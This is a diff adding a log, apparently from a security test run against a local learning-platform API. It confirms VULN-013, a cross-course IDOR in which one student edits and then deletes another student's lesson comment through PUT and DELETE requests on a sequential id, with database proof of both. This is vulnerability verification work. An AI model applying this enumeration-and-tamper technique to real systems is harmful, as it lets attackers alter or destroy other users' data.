@@ -1,0 +1,21 @@
+========================================================================
+VULN-013: Lesson-comment edit/delete IDOR (sequential id, cross-course)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[INFO] routes lesson.ts:222-255 gated by courseMemberMiddleware on the URL :courseId only
+[INFO] service lesson.ts:334-383 acts on the bare commentId — no author check, no course scope
+[SETUP] create course X + a lesson; org 'comments' app is enabled on this instance
+[SETUP] course X=766edcfd-ee01-47ac-87ee-3f6eadb63abd lesson=8da6e7df-110c-4034-81f7-fdd909847343
+[SETUP] student A=b9b6b8c1-0a6d-4b5a-a085-1617b0b4d9fb enrolled in X (role 3)
+[SETUP] student B=11f023c0-8493-4e44-b14e-b2f4792bb3d5 enrolled in Y=48cc01a5-dcb7-4e6e-a810-0c5f0cb5b4b7 (role 3), NOT in X
+[INFO] DB: student B membership rows in course X = 0 (expect 0)
+[STEP] student A: POST /course/X/lesson/8da6e7df-110c-4034-81f7-fdd909847343/comment -> HTTP 201
+[STEP] created lesson_comment id=5 (sequential bigint)
+[STEP] student B: PUT /course/Y/lesson/comment/5 (B is not in X) -> HTTP 200
+[PROOF] DB lesson_comment[5].comment after B's edit = 'HACKED by student B b_c96cebf1'
+[STEP] student B: DELETE /course/Y/lesson/comment/5 -> HTTP 200
+[PROOF] DB rows for lesson_comment id=5 after B's delete = 0 (expect 0)
+[INFO] cleanup: archived 2 test-student seat(s) created this run
+[PROOF] student B (course Y only) EDITED then DELETED student A's comment in course X by bare id 5 — cross-course IDOR over a sequential key, DB-confirmed
+==> VULN-013: CONFIRMED — any course member edits/deletes any lesson comment by enumerable id (no author/scope check)
+[OK] exploit confirmed — cross-course lesson-comment edit + delete
